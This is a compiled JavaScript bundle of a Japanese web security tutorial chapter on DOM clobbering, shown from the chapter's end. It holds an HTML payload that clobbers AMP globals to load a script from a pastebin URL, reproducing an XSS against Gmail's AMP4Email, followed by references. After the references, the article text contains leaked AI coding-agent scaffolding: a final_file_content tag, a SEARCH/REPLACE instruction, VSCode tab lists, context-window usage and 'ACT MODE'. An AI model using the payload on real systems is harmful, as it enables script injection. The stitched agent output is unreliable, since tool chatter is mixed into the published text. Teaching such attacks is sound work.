\u3092\u8a2d\u5b9a\u3067\u304d\u308c\u3070\u3001\u4efb\u610f\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u8aad\u307f\u8fbc\u3080\u3053\u3068\u304c\u3067\u304d\u307e\u3059\uff01"),(0,a.kt)("p",null,"\u3057\u305f\u304c\u3063\u3066\u3001\u30a8\u30af\u30b9\u30d7\u30ed\u30a4\u30c8\u306f\u6b21\u306e\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},'// AMP_MODE.test\u3068AMP_MODE.localDev\u3092clobber\u3057\u307e\u3059\n<a id="AMP_MODE" name="localDev"></a>\n<a id="AMP_MODE" name="test"></a>\n\n// testLocation.protocol\u3092\u8a2d\u5b9a\u3057\u307e\u3059\n<a id="testLocation"></a>\n<a id="testLocation" name="protocol" \n   href="https://pastebin.com/raw/0tn8z0rG#"></a>\n')),(0,a.kt)("p",null,"\u6700\u7d42\u7684\u306b\u3001\u4efb\u610f\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u6b63\u5e38\u306b\u8aad\u307f\u8fbc\u3080\u3053\u3068\u3067\u3001XSS\u3092\u9054\u6210\u3067\u304d\u307e\u3059\uff01\uff08\u305f\u3060\u3057\u3001\u8457\u8005\u306fCSP\u306b\u3088\u3063\u3066\u30d6\u30ed\u30c3\u30af\u3055\u308c\u308b\u524d\u306b\u3053\u306e\u30b9\u30c6\u30c3\u30d7\u307e\u3067\u3057\u304b\u5230\u9054\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002\u3053\u308c\u306fCSP\u304c\u4f9d\u7136\u3068\u3057\u3066\u975e\u5e38\u306b\u6709\u7528\u3067\u3042\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u307e\u3059\uff09\u3002"),(0,a.kt)("p",null,"\u3053\u308c\u306fDOM clobbering\u306e\u6700\u3082\u6709\u540d\u306a\u4e8b\u4f8b\u306e1\u3064\u3067\u3042\u308a\u3001\u3053\u306e\u8106\u5f31\u6027\u3092\u767a\u898b\u3057\u305f\u7814\u7a76\u8005\u306f\u3001Mutation XSS\u3068\u30d7\u30ed\u30c8\u30bf\u30a4\u30d7\u6c5a\u67d3\u306b\u3064\u3044\u3066\u4ee5\u524d\u306b\u8a00\u53ca\u3057\u305fMicha\u0142 Bentkowski\u6c0f\u3067\u3059\u3002\u5f7c\u306f\u591a\u304f\u306e\u53e4\u5178\u7684\u306a\u4e8b\u4f8b\u3092\u4e00\u4eba\u3067\u751f\u307f\u51fa\u3057\u307e\u3057\u305f\u3002"),(0,a.kt)("h2",{id:"\u307e\u3068\u3081"},"\u307e\u3068\u3081"),(0,a.kt)("p",null,"DOM clobbering\u306e\u4f7f\u7528\u4f8b\u306f\u9650\u3089\u308c\u3066\u3044\u307e\u3059\u304c\u3001\u78ba\u304b\u306b\u8208\u5473\u6df1\u3044\u653b\u6483\u65b9\u6cd5\u3067\u3059\uff01\u3055\u3089\u306b\u3001\u3053\u306e\u6a5f\u80fd\u3092\u77e5\u3089\u306a\u3044\u5834\u5408\u3001HTML\u3092\u4f7f\u7528\u3057\u3066\u30b0\u30ed\u30fc\u30d0\u30eb\u5909\u6570\u306e\u5185\u5bb9\u306b\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u3068\u306f\u8003\u3048\u3082\u3057\u306a\u304b\u3063\u305f\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002"),(0,a.kt)("p",null,"\u3053\u306e\u653b\u6483\u624b\u6cd5\u306b\u8208\u5473\u304c\u3042\u308b\u5834\u5408\u306f\u3001PortSwigger\u306e",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/dom-based/dom-clobbering"},"\u8a18\u4e8b"),"\u3092\u53c2\u7167\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u3053\u306e\u653b\u6483\u624b\u6cd5\u3092\u5b9f\u969b\u306b\u8a66\u3059\u305f\u3081\u306e2\u3064\u306e\u30e9\u30dc\u304c\u63d0\u4f9b\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u8aad\u3080\u3060\u3051\u3067\u306f\u4e0d\u5341\u5206\u3067\u3059\u3002\u5b8c\u5168\u306b\u7406\u89e3\u3059\u308b\u306b\u306f\u3001\u5b9f\u969b\u306b\u653b\u6483\u3092\u8a66\u3059\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002"),(0,a.kt)("p",null,"\u53c2\u8003\u6587\u732e\uff1a"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships"},"Dom Clobbering\u3092\u4f7f\u7528\u3057\u3066XSS\u3092\u62e1\u5f35\u3059\u308b")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://portswigger.net/research/dom-clobbering-strikes-back"},"DOM Clobbering strikes back")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E7%BF%92%E8%AE%B0%E9%8C%84/"},"DOM Clobbering Attack\u5b66\u7fd2\u8a18\u9332.md")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E7%BF%92%E8%AE%B0%E9%8C%84/"},"DOM Clobbering\u5b66\u7fd2\u8a18\u9332")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://research.securitum.com/xss-in-amp4email-dom-clobbering/"},"XSS in GMail\u2019s AMP4Email via DOM Clobbering")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable"},"\u8981\u7d20\u306eid\u3092\u30b0\u30ed\u30fc\u30d0\u30eb\u5909\u6570\u306b\u3059\u308b\u4ed5\u69d8\u306f\u3042\u308a\u307e\u3059\u304b\uff1f")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript"},"JavaScript\u3067\u8981\u7d20ID\u3092\u8b58\u5225\u5b50\u3068\u3057\u3066\u4f7f\u7528\u3057\u306a\u3044\u306e\u306f\u306a\u305c\u3067\u3059\u304b\uff1f")),(0,a.kt)("li",{parentName:"ol"},(0,a.kt)("a",{parentName:"li",href:"https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables"},"id\u3092\u6301\u3064DOM\u30c4\u30ea\u30fc\u8981\u7d20\u306f\u30b0\u30ed\u30fc\u30d0\u30eb\u5909\u6570\u306b\u306a\u308a\u307e\u3059\u304b\uff1f"))),(0,a.kt)("p",null,"</final_file_content>"),(0,a.kt)("p",null,"IMPORTANT: For any future changes to this file, use the final_file_content shown above as your reference. This content reflects the current state of the file, including any auto-formatting (e.g., if you used single quotes but the formatter converted them to double quotes). Always base your SEARCH/REPLACE operations on this final version to ensure accuracy."),(0,a.kt)("p",null,"<environment_details>"),(0,a.kt)("h1",{id:"vscode-visible-files"},"VSCode Visible Files"),(0,a.kt)("p",null,"i18n/en/docusaurus-plugin-content-docs/current/ch1/05-javascript-protocol.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch3/15-dom-clobbering.md"),(0,a.kt)("h1",{id:"vscode-open-tabs"},"VSCode Open Tabs"),(0,a.kt)("p",null,"i18n/ja/docusaurus-plugin-content-docs/current/ch1/03-xss-introduction.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch1/04-know-xss-a-bit-more.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch1/05-javascript-protocol.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/06-xss-defense-sanitization.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/07-xss-defense-csp.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/08-token-storage.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/09-trust-types.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/10-csp-bypass.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/11-mutation-xss.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch2/12-universal-xss.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch3/13-attack-without-js.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch3/14-prototype-pollution.md\ni18n/ja/docusaurus-plugin-content-docs/current/ch3/15-dom-clobbering.md\ni18n/en/docusaurus-plugin-content-docs/current/ch1/05-javascript-protocol.md"),(0,a.kt)("h1",{id:"current-time"},"Current Time"),(0,a.kt)("p",null,"2025/5/20 \u5348\u524d9:35:00 (Asia/Tokyo, UTC+9:00)"),(0,a.kt)("h1",{id:"context-window-usage"},"Context Window Usage"),(0,a.kt)("p",null,"436,085 / 1,048.576K tokens used (42%)"),(0,a.kt)("h1",{id:"current-mode"},"Current Mode"),(0,a.kt)("p",null,"ACT MODE\n</environment_details>"))}s.isMDXComponent=!0},770:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-01-9d0ae7b83eca58a9e10cfe0543268273.png"},1832:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-02-57de123e33ca887fbee29b26f822617d.png"},4594:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-03-22deb60dd4591e032f7672becb75b144.png"},7415:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-04-8394bad6263cb93221d8a88c9de49769.png"},8312:(e,n,t)=>{t.d(n,{Z:()=>l});const l=t.p+"assets/images/15-05-5e028fd5d013ef7e39f4cb344bc5068f.png"}}]);